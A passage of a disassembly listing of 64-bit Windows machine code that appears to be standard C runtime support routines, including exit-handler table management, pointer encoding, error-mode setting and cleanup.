   140004ee8:	48 89 15 19 40 01 00 	mov    %rdx,0x14019(%rip)        # 0x140018f08
   140004eef:	48 83 c4 28          	add    $0x28,%rsp
   140004ef3:	c3                   	ret
   140004ef4:	e8 27 07 00 00       	call   0x140005620
   140004ef9:	cc                   	int3
   140004efa:	cc                   	int3
   140004efb:	cc                   	int3
   140004efc:	45 33 c0             	xor    %r8d,%r8d
   140004eff:	33 d2                	xor    %edx,%edx
   140004f01:	e9 e6 fd ff ff       	jmp    0x140004cec
   140004f06:	cc                   	int3
   140004f07:	cc                   	int3
   140004f08:	48 83 ec 28          	sub    $0x28,%rsp
   140004f0c:	8d 81 00 c0 ff ff    	lea    -0x4000(%rcx),%eax
   140004f12:	a9 ff 3f ff ff       	test   $0xffff3fff,%eax
   140004f17:	75 12                	jne    0x140004f2b
   140004f19:	81 f9 00 c0 00 00    	cmp    $0xc000,%ecx
   140004f1f:	74 0a                	je     0x140004f2b
   140004f21:	87 0d bd 42 01 00    	xchg   %ecx,0x142bd(%rip)        # 0x1400191e4
   140004f27:	33 c0                	xor    %eax,%eax
   140004f29:	eb 15                	jmp    0x140004f40
   140004f2b:	e8 64 16 00 00       	call   0x140006594
   140004f30:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140004f36:	e8 01 14 00 00       	call   0x14000633c
   140004f3b:	b8 16 00 00 00       	mov    $0x16,%eax
   140004f40:	48 83 c4 28          	add    $0x28,%rsp
   140004f44:	c3                   	ret
   140004f45:	cc                   	int3
   140004f46:	cc                   	int3
   140004f47:	cc                   	int3
   140004f48:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004f4d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140004f52:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004f57:	57                   	push   %rdi
   140004f58:	48 83 ec 30          	sub    $0x30,%rsp
   140004f5c:	49 8b f9             	mov    %r9,%rdi
   140004f5f:	8b 0a                	mov    (%rdx),%ecx
   140004f61:	e8 82 2a 00 00       	call   0x1400079e8
   140004f66:	90                   	nop
   140004f67:	48 8d 1d 8a 46 01 00 	lea    0x1468a(%rip),%rbx        # 0x1400195f8
   140004f6e:	48 8d 35 8b 36 01 00 	lea    0x1368b(%rip),%rsi        # 0x140018600
   140004f75:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140004f7a:	48 8d 05 7f 46 01 00 	lea    0x1467f(%rip),%rax        # 0x140019600
   140004f81:	48 3b d8             	cmp    %rax,%rbx
   140004f84:	74 19                	je     0x140004f9f
   140004f86:	48 39 33             	cmp    %rsi,(%rbx)
   140004f89:	74 0e                	je     0x140004f99
   140004f8b:	48 8b d6             	mov    %rsi,%rdx
   140004f8e:	48 8b cb             	mov    %rbx,%rcx
   140004f91:	e8 3a 39 00 00       	call   0x1400088d0
   140004f96:	48 89 03             	mov    %rax,(%rbx)
   140004f99:	48 83 c3 08          	add    $0x8,%rbx
   140004f9d:	eb d6                	jmp    0x140004f75
   140004f9f:	8b 0f                	mov    (%rdi),%ecx
   140004fa1:	e8 96 2a 00 00       	call   0x140007a3c
   140004fa6:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140004fab:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140004fb0:	48 83 c4 30          	add    $0x30,%rsp
   140004fb4:	5f                   	pop    %rdi
   140004fb5:	c3                   	ret
   140004fb6:	cc                   	int3
   140004fb7:	cc                   	int3
   140004fb8:	b8 01 00 00 00       	mov    $0x1,%eax
   140004fbd:	87 05 51 3f 01 00    	xchg   %eax,0x13f51(%rip)        # 0x140018f14
   140004fc3:	c3                   	ret
   140004fc4:	4c 8b dc             	mov    %rsp,%r11
   140004fc7:	48 83 ec 28          	sub    $0x28,%rsp
   140004fcb:	b8 04 00 00 00       	mov    $0x4,%eax
   140004fd0:	4d 8d 4b 10          	lea    0x10(%r11),%r9
   140004fd4:	4d 8d 43 08          	lea    0x8(%r11),%r8
   140004fd8:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140004fdc:	49 8d 53 18          	lea    0x18(%r11),%rdx
   140004fe0:	89 44 24 40          	mov    %eax,0x40(%rsp)
   140004fe4:	49 8d 4b 08          	lea    0x8(%r11),%rcx
   140004fe8:	e8 5b ff ff ff       	call   0x140004f48
   140004fed:	48 83 c4 28          	add    $0x28,%rsp
   140004ff1:	c3                   	ret
   140004ff2:	cc                   	int3
   140004ff3:	cc                   	int3
   140004ff4:	40 53                	rex push %rbx
   140004ff6:	48 83 ec 20          	sub    $0x20,%rsp
   140004ffa:	8b d9                	mov    %ecx,%ebx
   140004ffc:	e8 53 0c 00 00       	call   0x140005c54
   140005001:	44 8b 80 a8 03 00 00 	mov    0x3a8(%rax),%r8d
   140005008:	41 8b d0             	mov    %r8d,%edx
   14000500b:	80 e2 02             	and    $0x2,%dl
   14000500e:	f6 da                	neg    %dl
   140005010:	1b c9                	sbb    %ecx,%ecx
   140005012:	83 fb ff             	cmp    $0xffffffff,%ebx
   140005015:	74 36                	je     0x14000504d
   140005017:	85 db                	test   %ebx,%ebx
   140005019:	74 39                	je     0x140005054
   14000501b:	83 fb 01             	cmp    $0x1,%ebx
   14000501e:	74 20                	je     0x140005040
   140005020:	83 fb 02             	cmp    $0x2,%ebx
   140005023:	74 15                	je     0x14000503a
   140005025:	e8 6a 15 00 00       	call   0x140006594
   14000502a:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140005030:	e8 07 13 00 00       	call   0x14000633c
   140005035:	83 c8 ff             	or     $0xffffffff,%eax
   140005038:	eb 1d                	jmp    0x140005057
   14000503a:	41 83 e0 fd          	and    $0xfffffffd,%r8d
   14000503e:	eb 04                	jmp    0x140005044
   140005040:	41 83 c8 02          	or     $0x2,%r8d
   140005044:	44 89 80 a8 03 00 00 	mov    %r8d,0x3a8(%rax)
   14000504b:	eb 07                	jmp    0x140005054
   14000504d:	83 0d bc 37 01 00 ff 	orl    $0xffffffff,0x137bc(%rip)        # 0x140018810
   140005054:	8d 41 02             	lea    0x2(%rcx),%eax
   140005057:	48 83 c4 20          	add    $0x20,%rsp
   14000505b:	5b                   	pop    %rbx
   14000505c:	c3                   	ret
   14000505d:	cc                   	int3
   14000505e:	cc                   	int3
   14000505f:	cc                   	int3
   140005060:	8b 05 b2 3e 01 00    	mov    0x13eb2(%rip),%eax        # 0x140018f18
   140005066:	c3                   	ret
   140005067:	cc                   	int3
   140005068:	48 83 ec 28          	sub    $0x28,%rsp
   14000506c:	83 f9 01             	cmp    $0x1,%ecx
   14000506f:	76 15                	jbe    0x140005086
   140005071:	e8 1e 15 00 00       	call   0x140006594
   140005076:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000507c:	e8 bb 12 00 00       	call   0x14000633c
   140005081:	83 c8 ff             	or     $0xffffffff,%eax
   140005084:	eb 08                	jmp    0x14000508e
   140005086:	87 0d 8c 3e 01 00    	xchg   %ecx,0x13e8c(%rip)        # 0x140018f18
   14000508c:	8b c1                	mov    %ecx,%eax
   14000508e:	48 83 c4 28          	add    $0x28,%rsp
   140005092:	c3                   	ret
   140005093:	cc                   	int3
   140005094:	48 8d 05 81 3e 01 00 	lea    0x13e81(%rip),%rax        # 0x140018f1c
   14000509b:	c3                   	ret
   14000509c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400050a1:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400050a6:	57                   	push   %rdi
   1400050a7:	48 83 ec 20          	sub    $0x20,%rsp
   1400050ab:	49 8b d9             	mov    %r9,%rbx
   1400050ae:	49 8b f8             	mov    %r8,%rdi
   1400050b1:	8b 0a                	mov    (%rdx),%ecx
   1400050b3:	e8 30 29 00 00       	call   0x1400079e8
   1400050b8:	90                   	nop
   1400050b9:	48 8b cf             	mov    %rdi,%rcx
   1400050bc:	e8 53 00 00 00       	call   0x140005114
   1400050c1:	8b f8                	mov    %eax,%edi
   1400050c3:	8b 0b                	mov    (%rbx),%ecx
   1400050c5:	e8 72 29 00 00       	call   0x140007a3c
   1400050ca:	8b c7                	mov    %edi,%eax
   1400050cc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400050d1:	48 83 c4 20          	add    $0x20,%rsp
   1400050d5:	5f                   	pop    %rdi
   1400050d6:	c3                   	ret
   1400050d7:	cc                   	int3
   1400050d8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400050dd:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400050e2:	57                   	push   %rdi
   1400050e3:	48 83 ec 20          	sub    $0x20,%rsp
   1400050e7:	49 8b d9             	mov    %r9,%rbx
   1400050ea:	49 8b f8             	mov    %r8,%rdi
   1400050ed:	8b 0a                	mov    (%rdx),%ecx
   1400050ef:	e8 f4 28 00 00       	call   0x1400079e8
   1400050f4:	90                   	nop
   1400050f5:	48 8b cf             	mov    %rdi,%rcx
   1400050f8:	e8 c7 01 00 00       	call   0x1400052c4
   1400050fd:	8b f8                	mov    %eax,%edi
   1400050ff:	8b 0b                	mov    (%rbx),%ecx
   140005101:	e8 36 29 00 00       	call   0x140007a3c
   140005106:	8b c7                	mov    %edi,%eax
   140005108:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000510d:	48 83 c4 20          	add    $0x20,%rsp
   140005111:	5f                   	pop    %rdi
   140005112:	c3                   	ret
   140005113:	cc                   	int3
   140005114:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140005119:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000511e:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140005123:	57                   	push   %rdi
   140005124:	41 56                	push   %r14
   140005126:	41 57                	push   %r15
   140005128:	48 83 ec 20          	sub    $0x20,%rsp
   14000512c:	48 8b 01             	mov    (%rcx),%rax
   14000512f:	33 ed                	xor    %ebp,%ebp
   140005131:	4c 8b f9             	mov    %rcx,%r15
   140005134:	48 8b 18             	mov    (%rax),%rbx
   140005137:	48 85 db             	test   %rbx,%rbx
   14000513a:	0f 84 68 01 00 00    	je     0x1400052a8
   140005140:	4c 8b 15 f9 2e 01 00 	mov    0x12ef9(%rip),%r10        # 0x140018040
   140005147:	48 8b 33             	mov    (%rbx),%rsi
   14000514a:	41 8b ca             	mov    %r10d,%ecx
   14000514d:	4c 8b 4b 08          	mov    0x8(%rbx),%r9
   140005151:	83 e1 3f             	and    $0x3f,%ecx
   140005154:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   140005158:	49 33 f2             	xor    %r10,%rsi
   14000515b:	4d 33 ca             	xor    %r10,%r9
   14000515e:	48 d3 ce             	ror    %cl,%rsi
   140005161:	49 33 da             	xor    %r10,%rbx
   140005164:	49 d3 c9             	ror    %cl,%r9
   140005167:	48 d3 cb             	ror    %cl,%rbx
   14000516a:	4c 3b cb             	cmp    %rbx,%r9
   14000516d:	0f 85 a7 00 00 00    	jne    0x14000521a
   140005173:	48 2b de             	sub    %rsi,%rbx
   140005176:	b8 00 02 00 00       	mov    $0x200,%eax
   14000517b:	48 c1 fb 03          	sar    $0x3,%rbx
   14000517f:	48 3b d8             	cmp    %rax,%rbx
   140005182:	48 8b fb             	mov    %rbx,%rdi
   140005185:	48 0f 47 f8          	cmova  %rax,%rdi
   140005189:	8d 45 20             	lea    0x20(%rbp),%eax
   14000518c:	48 03 fb             	add    %rbx,%rdi
   14000518f:	48 0f 44 f8          	cmove  %rax,%rdi
   140005193:	48 3b fb             	cmp    %rbx,%rdi
   140005196:	72 1e                	jb     0x1400051b6
   140005198:	44 8d 45 08          	lea    0x8(%rbp),%r8d
   14000519c:	48 8b d7             	mov    %rdi,%rdx
   14000519f:	48 8b ce             	mov    %rsi,%rcx
   1400051a2:	e8 fd 3b 00 00       	call   0x140008da4
   1400051a7:	33 c9                	xor    %ecx,%ecx
   1400051a9:	4c 8b f0             	mov    %rax,%r14
   1400051ac:	e8 7b 14 00 00       	call   0x14000662c
   1400051b1:	4d 85 f6             	test   %r14,%r14
   1400051b4:	75 28                	jne    0x1400051de
   1400051b6:	48 8d 7b 04          	lea    0x4(%rbx),%rdi
   1400051ba:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   1400051c0:	48 8b d7             	mov    %rdi,%rdx
   1400051c3:	48 8b ce             	mov    %rsi,%rcx
   1400051c6:	e8 d9 3b 00 00       	call   0x140008da4
   1400051cb:	33 c9                	xor    %ecx,%ecx
   1400051cd:	4c 8b f0             	mov    %rax,%r14
   1400051d0:	e8 57 14 00 00       	call   0x14000662c
   1400051d5:	4d 85 f6             	test   %r14,%r14
   1400051d8:	0f 84 ca 00 00 00    	je     0x1400052a8
   1400051de:	4c 8b 15 5b 2e 01 00 	mov    0x12e5b(%rip),%r10        # 0x140018040
   1400051e5:	4d 8d 0c de          	lea    (%r14,%rbx,8),%r9
   1400051e9:	49 8d 1c fe          	lea    (%r14,%rdi,8),%rbx
   1400051ed:	49 8b f6             	mov    %r14,%rsi
   1400051f0:	48 8b cb             	mov    %rbx,%rcx
   1400051f3:	49 2b c9             	sub    %r9,%rcx
   1400051f6:	48 83 c1 07          	add    $0x7,%rcx
   1400051fa:	48 c1 e9 03          	shr    $0x3,%rcx
   1400051fe:	4c 3b cb             	cmp    %rbx,%r9
   140005201:	48 0f 47 cd          	cmova  %rbp,%rcx
   140005205:	48 85 c9             	test   %rcx,%rcx
   140005208:	74 10                	je     0x14000521a
   14000520a:	49 8b c2             	mov    %r10,%rax
   14000520d:	49 8b f9             	mov    %r9,%rdi
   140005210:	f3 48 ab             	rep stos %rax,(%rdi)
   140005213:	4c 8b 15 26 2e 01 00 	mov    0x12e26(%rip),%r10        # 0x140018040
   14000521a:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140005220:	49 8d 79 08          	lea    0x8(%r9),%rdi
   140005224:	41 8b c8             	mov    %r8d,%ecx
   140005227:	41 8b c2             	mov    %r10d,%eax
   14000522a:	83 e0 3f             	and    $0x3f,%eax
   14000522d:	2b c8                	sub    %eax,%ecx
   14000522f:	49 8b 47 08          	mov    0x8(%r15),%rax
   140005233:	48 8b 10             	mov    (%rax),%rdx
   140005236:	41 8b c0             	mov    %r8d,%eax
   140005239:	48 d3 ca             	ror    %cl,%rdx
   14000523c:	49 33 d2             	xor    %r10,%rdx
   14000523f:	49 89 11             	mov    %rdx,(%r9)
   140005242:	48 8b 15 f7 2d 01 00 	mov    0x12df7(%rip),%rdx        # 0x140018040
   140005249:	8b ca                	mov    %edx,%ecx
   14000524b:	83 e1 3f             	and    $0x3f,%ecx
   14000524e:	2b c1                	sub    %ecx,%eax
   140005250:	8a c8                	mov    %al,%cl
   140005252:	49 8b 07             	mov    (%r15),%rax
   140005255:	48 d3 ce             	ror    %cl,%rsi
   140005258:	48 33 f2             	xor    %rdx,%rsi
   14000525b:	48 8b 08             	mov    (%rax),%rcx
   14000525e:	48 89 31             	mov    %rsi,(%rcx)
   140005261:	41 8b c8             	mov    %r8d,%ecx
   140005264:	48 8b 15 d5 2d 01 00 	mov    0x12dd5(%rip),%rdx        # 0x140018040
   14000526b:	8b c2                	mov    %edx,%eax
   14000526d:	83 e0 3f             	and    $0x3f,%eax
   140005270:	2b c8                	sub    %eax,%ecx
   140005272:	49 8b 07             	mov    (%r15),%rax
   140005275:	48 d3 cf             	ror    %cl,%rdi
   140005278:	48 33 fa             	xor    %rdx,%rdi
   14000527b:	48 8b 10             	mov    (%rax),%rdx
   14000527e:	48 89 7a 08          	mov    %rdi,0x8(%rdx)
   140005282:	48 8b 15 b7 2d 01 00 	mov    0x12db7(%rip),%rdx        # 0x140018040
   140005289:	8b c2                	mov    %edx,%eax
   14000528b:	83 e0 3f             	and    $0x3f,%eax
   14000528e:	44 2b c0             	sub    %eax,%r8d
   140005291:	49 8b 07             	mov    (%r15),%rax
   140005294:	41 8a c8             	mov    %r8b,%cl
   140005297:	48 d3 cb             	ror    %cl,%rbx
   14000529a:	48 33 da             	xor    %rdx,%rbx
   14000529d:	48 8b 08             	mov    (%rax),%rcx
   1400052a0:	33 c0                	xor    %eax,%eax
   1400052a2:	48 89 59 10          	mov    %rbx,0x10(%rcx)
   1400052a6:	eb 03                	jmp    0x1400052ab
   1400052a8:	83 c8 ff             	or     $0xffffffff,%eax
   1400052ab:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   1400052b0:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   1400052b5:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400052ba:	48 83 c4 20          	add    $0x20,%rsp
   1400052be:	41 5f                	pop    %r15
   1400052c0:	41 5e                	pop    %r14
   1400052c2:	5f                   	pop    %rdi
   1400052c3:	c3                   	ret
   1400052c4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400052c9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400052ce:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400052d3:	57                   	push   %rdi
   1400052d4:	41 56                	push   %r14
   1400052d6:	41 57                	push   %r15
   1400052d8:	48 83 ec 20          	sub    $0x20,%rsp
   1400052dc:	48 8b 01             	mov    (%rcx),%rax
   1400052df:	48 8b f1             	mov    %rcx,%rsi
   1400052e2:	48 8b 18             	mov    (%rax),%rbx
   1400052e5:	48 85 db             	test   %rbx,%rbx
   1400052e8:	75 08                	jne    0x1400052f2
   1400052ea:	83 c8 ff             	or     $0xffffffff,%eax
   1400052ed:	e9 d9 00 00 00       	jmp    0x1400053cb
   1400052f2:	48 8b 3b             	mov    (%rbx),%rdi
   1400052f5:	4c 8b 05 44 2d 01 00 	mov    0x12d44(%rip),%r8        # 0x140018040
   1400052fc:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
   140005300:	49 33 f8             	xor    %r8,%rdi
   140005303:	49 33 d8             	xor    %r8,%rbx
   140005306:	41 8b c8             	mov    %r8d,%ecx
   140005309:	83 e1 3f             	and    $0x3f,%ecx
   14000530c:	48 d3 cf             	ror    %cl,%rdi
   14000530f:	48 d3 cb             	ror    %cl,%rbx
   140005312:	48 8d 47 ff          	lea    -0x1(%rdi),%rax
   140005316:	48 83 f8 fd          	cmp    $0xfffffffffffffffd,%rax
   14000531a:	0f 87 a9 00 00 00    	ja     0x1400053c9
   140005320:	41 8b c8             	mov    %r8d,%ecx
   140005323:	4d 8b f0             	mov    %r8,%r14
   140005326:	83 e1 3f             	and    $0x3f,%ecx
   140005329:	4c 8b ff             	mov    %rdi,%r15
   14000532c:	48 8b eb             	mov    %rbx,%rbp
   14000532f:	48 83 eb 08          	sub    $0x8,%rbx
   140005333:	48 3b df             	cmp    %rdi,%rbx
   140005336:	72 5f                	jb     0x140005397
   140005338:	48 8b 03             	mov    (%rbx),%rax
   14000533b:	49 3b c6             	cmp    %r14,%rax
   14000533e:	74 ef                	je     0x14000532f
   140005340:	49 33 c0             	xor    %r8,%rax
   140005343:	4c 89 33             	mov    %r14,(%rbx)
   140005346:	48 d3 c8             	ror    %cl,%rax
   140005349:	49 ba 70 48 da 56 96 	movabs $0x85f13e9656da4870,%r10
   140005350:	3e f1 85 
   140005353:	ff 15 0f 8f 00 00    	call   *0x8f0f(%rip)        # 0x14000e268
   140005359:	4c 8b 05 e0 2c 01 00 	mov    0x12ce0(%rip),%r8        # 0x140018040
   140005360:	48 8b 06             	mov    (%rsi),%rax
   140005363:	41 8b c8             	mov    %r8d,%ecx
   140005366:	83 e1 3f             	and    $0x3f,%ecx
   140005369:	48 8b 10             	mov    (%rax),%rdx
   14000536c:	4c 8b 0a             	mov    (%rdx),%r9
   14000536f:	48 8b 42 08          	mov    0x8(%rdx),%rax
   140005373:	4d 33 c8             	xor    %r8,%r9
   140005376:	49 33 c0             	xor    %r8,%rax
   140005379:	49 d3 c9             	ror    %cl,%r9
   14000537c:	48 d3 c8             	ror    %cl,%rax
   14000537f:	4d 3b cf             	cmp    %r15,%r9
   140005382:	75 05                	jne    0x140005389
   140005384:	48 3b c5             	cmp    %rbp,%rax
   140005387:	74 a6                	je     0x14000532f
   140005389:	4d 8b f9             	mov    %r9,%r15
   14000538c:	49 8b f9             	mov    %r9,%rdi
   14000538f:	48 8b e8             	mov    %rax,%rbp
   140005392:	48 8b d8             	mov    %rax,%rbx
   140005395:	eb 98                	jmp    0x14000532f
   140005397:	48 83 ff ff          	cmp    $0xffffffffffffffff,%rdi
   14000539b:	74 0f                	je     0x1400053ac
   14000539d:	48 8b cf             	mov    %rdi,%rcx
   1400053a0:	e8 87 12 00 00       	call   0x14000662c
   1400053a5:	4c 8b 05 94 2c 01 00 	mov    0x12c94(%rip),%r8        # 0x140018040
   1400053ac:	48 8b 06             	mov    (%rsi),%rax
   1400053af:	48 8b 08             	mov    (%rax),%rcx
   1400053b2:	4c 89 01             	mov    %r8,(%rcx)
   1400053b5:	48 8b 06             	mov    (%rsi),%rax
   1400053b8:	48 8b 08             	mov    (%rax),%rcx
   1400053bb:	4c 89 41 08          	mov    %r8,0x8(%rcx)
   1400053bf:	48 8b 06             	mov    (%rsi),%rax
   1400053c2:	48 8b 08             	mov    (%rax),%rcx
   1400053c5:	4c 89 41 10          	mov    %r8,0x10(%rcx)
   1400053c9:	33 c0                	xor    %eax,%eax
   1400053cb:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400053d0:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   1400053d5:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   1400053da:	48 83 c4 20          	add    $0x20,%rsp
   1400053de:	41 5f                	pop    %r15
   1400053e0:	41 5e                	pop    %r14
   1400053e2:	5f                   	pop    %rdi
   1400053e3:	c3                   	ret
   1400053e4:	48 8b d1             	mov    %rcx,%rdx
   1400053e7:	48 8d 0d 32 3b 01 00 	lea    0x13b32(%rip),%rcx        # 0x140018f20
   1400053ee:	e9 6d 00 00 00       	jmp    0x140005460
   1400053f3:	cc                   	int3
   1400053f4:	4c 8b dc             	mov    %rsp,%r11
   1400053f7:	49 89 4b 08          	mov    %rcx,0x8(%r11)
   1400053fb:	48 83 ec 38          	sub    $0x38,%rsp
   1400053ff:	49 c7 43 f0 fe ff ff 	movq   $0xfffffffffffffffe,-0x10(%r11)
   140005406:	ff 
   140005407:	49 8d 43 08          	lea    0x8(%r11),%rax
   14000540b:	49 89 43 e8          	mov    %rax,-0x18(%r11)
   14000540f:	b8 02 00 00 00       	mov    $0x2,%eax
   140005414:	89 44 24 50          	mov    %eax,0x50(%rsp)
   140005418:	89 44 24 58          	mov    %eax,0x58(%rsp)
   14000541c:	4d 8d 4b 18          	lea    0x18(%r11),%r9
   140005420:	4d 8d 43 e8          	lea    -0x18(%r11),%r8
   140005424:	49 8d 53 20          	lea    0x20(%r11),%rdx
   140005428:	49 8d 4b 10          	lea    0x10(%r11),%rcx
   14000542c:	e8 a7 fc ff ff       	call   0x1400050d8
   140005431:	90                   	nop
   140005432:	48 83 c4 38          	add    $0x38,%rsp
   140005436:	c3                   	ret
   140005437:	cc                   	int3
   140005438:	48 85 c9             	test   %rcx,%rcx
   14000543b:	75 04                	jne    0x140005441
   14000543d:	83 c8 ff             	or     $0xffffffff,%eax
   140005440:	c3                   	ret
   140005441:	48 8b 41 10          	mov    0x10(%rcx),%rax
   140005445:	48 39 01             	cmp    %rax,(%rcx)
   140005448:	75 12                	jne    0x14000545c
   14000544a:	48 8b 05 ef 2b 01 00 	mov    0x12bef(%rip),%rax        # 0x140018040
   140005451:	48 89 01             	mov    %rax,(%rcx)
   140005454:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140005458:	48 89 41 10          	mov    %rax,0x10(%rcx)
   14000545c:	33 c0                	xor    %eax,%eax
   14000545e:	c3                   	ret
   14000545f:	cc                   	int3
   140005460:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140005465:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000546a:	55                   	push   %rbp
   14000546b:	48 8b ec             	mov    %rsp,%rbp
   14000546e:	48 83 ec 40          	sub    $0x40,%rsp
   140005472:	48 8d 45 10          	lea    0x10(%rbp),%rax
   140005476:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   14000547a:	4c 8d 4d 28          	lea    0x28(%rbp),%r9
   14000547e:	48 8d 45 18          	lea    0x18(%rbp),%rax
   140005482:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140005486:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   14000548a:	b8 02 00 00 00       	mov    $0x2,%eax
   14000548f:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   140005493:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   140005497:	89 45 28             	mov    %eax,0x28(%rbp)
   14000549a:	89 45 e0             	mov    %eax,-0x20(%rbp)
   14000549d:	e8 fa fb ff ff       	call   0x14000509c
   1400054a2:	48 83 c4 40          	add    $0x40,%rsp
   1400054a6:	5d                   	pop    %rbp
   1400054a7:	c3                   	ret
   1400054a8:	48 83 ec 28          	sub    $0x28,%rsp
   1400054ac:	48 8b 0d 25 43 01 00 	mov    0x14325(%rip),%rcx        # 0x1400197d8
   1400054b3:	e8 74 11 00 00       	call   0x14000662c
   1400054b8:	48 8b 0d 21 43 01 00 	mov    0x14321(%rip),%rcx        # 0x1400197e0
   1400054bf:	48 83 25 11 43 01 00 	andq   $0x0,0x14311(%rip)        # 0x1400197d8
   1400054c6:	00 
   1400054c7:	e8 60 11 00 00       	call   0x14000662c
   1400054cc:	48 8b 0d b5 3a 01 00 	mov    0x13ab5(%rip),%rcx        # 0x140018f88
   1400054d3:	48 83 25 05 43 01 00 	andq   $0x0,0x14305(%rip)        # 0x1400197e0
   1400054da:	00 
   1400054db:	e8 4c 11 00 00       	call   0x14000662c
   1400054e0:	48 8b 0d a9 3a 01 00 	mov    0x13aa9(%rip),%rcx        # 0x140018f90
   1400054e7:	48 83 25 99 3a 01 00 	andq   $0x0,0x13a99(%rip)        # 0x140018f88
   1400054ee:	00 
   1400054ef:	e8 38 11 00 00       	call   0x14000662c
   1400054f4:	48 83 25 94 3a 01 00 	andq   $0x0,0x13a94(%rip)        # 0x140018f90
   1400054fb:	00 
   1400054fc:	b0 01                	mov    $0x1,%al
   1400054fe:	48 83 c4 28          	add    $0x28,%rsp
   140005502:	c3                   	ret
   140005503:	cc                   	int3
   140005504:	48 8d 05 f5 30 01 00 	lea    0x130f5(%rip),%rax        # 0x140018600
   14000550b:	48 89 05 e6 40 01 00 	mov    %rax,0x140e6(%rip)        # 0x1400195f8
   140005512:	b0 01                	mov    $0x1,%al
   140005514:	c3                   	ret
   140005515:	cc                   	int3
   140005516:	cc                   	int3
   140005517:	cc                   	int3
   140005518:	48 83 ec 28          	sub    $0x28,%rsp
   14000551c:	48 8d 0d fd 39 01 00 	lea    0x139fd(%rip),%rcx        # 0x140018f20
   140005523:	e8 10 ff ff ff       	call   0x140005438
   140005528:	48 8d 0d 09 3a 01 00 	lea    0x13a09(%rip),%rcx        # 0x140018f38
   14000552f:	e8 04 ff ff ff       	call   0x140005438
   140005534:	b0 01                	mov    $0x1,%al
   140005536:	48 83 c4 28          	add    $0x28,%rsp
   14000553a:	c3                   	ret
   14000553b:	cc                   	int3
   14000553c:	48 83 ec 28          	sub    $0x28,%rsp
   140005540:	e8 77 f5 ff ff       	call   0x140004abc
   140005545:	b0 01                	mov    $0x1,%al
   140005547:	48 83 c4 28          	add    $0x28,%rsp
   14000554b:	c3                   	ret
   14000554c:	40 53                	rex push %rbx
   14000554e:	48 83 ec 20          	sub    $0x20,%rsp
   140005552:	48 8b 1d e7 2a 01 00 	mov    0x12ae7(%rip),%rbx        # 0x140018040
   140005559:	48 8b cb             	mov    %rbx,%rcx
   14000555c:	e8 67 0c 00 00       	call   0x1400061c8
   140005561:	48 8b cb             	mov    %rbx,%rcx
   140005564:	e8 d7 39 00 00       	call   0x140008f40
   140005569:	48 8b cb             	mov    %rbx,%rcx
   14000556c:	e8 bf 3a 00 00       	call   0x140009030
   140005571:	48 8b cb             	mov    %rbx,%rcx
   140005574:	e8 4b ef ff ff       	call   0x1400044c4
   140005579:	48 8b cb             	mov    %rbx,%rcx
   14000557c:	e8 07 f9 ff ff       	call   0x140004e88
   140005581:	b0 01                	mov    $0x1,%al
   140005583:	48 83 c4 20          	add    $0x20,%rsp
   140005587:	5b                   	pop    %rbx
   140005588:	c3                   	ret
   140005589:	cc                   	int3
   14000558a:	cc                   	int3
   14000558b:	cc                   	int3
   14000558c:	33 c9                	xor    %ecx,%ecx
   14000558e:	e9 2d c8 ff ff       	jmp    0x140001dc0
   140005593:	cc                   	int3
   140005594:	40 53                	rex push %rbx
   140005596:	48 83 ec 20          	sub    $0x20,%rsp
   14000559a:	48 8b 0d c7 39 01 00 	mov    0x139c7(%rip),%rcx        # 0x140018f68
   1400055a1:	83 c8 ff             	or     $0xffffffff,%eax
   1400055a4:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   1400055a8:	83 f8 01             	cmp    $0x1,%eax
   1400055ab:	75 1f                	jne    0x1400055cc
   1400055ad:	48 8b 0d b4 39 01 00 	mov    0x139b4(%rip),%rcx        # 0x140018f68
   1400055b4:	48 8d 1d 05 2b 01 00 	lea    0x12b05(%rip),%rbx        # 0x1400180c0
   1400055bb:	48 3b cb             	cmp    %rbx,%rcx
   1400055be:	74 0c                	je     0x1400055cc
   1400055c0:	e8 67 10 00 00       	call   0x14000662c
   1400055c5:	48 89 1d 9c 39 01 00 	mov    %rbx,0x1399c(%rip)        # 0x140018f68
   1400055cc:	b0 01                	mov    $0x1,%al
   1400055ce:	48 83 c4 20          	add    $0x20,%rsp
   1400055d2:	5b                   	pop    %rbx
   1400055d3:	c3                   	ret
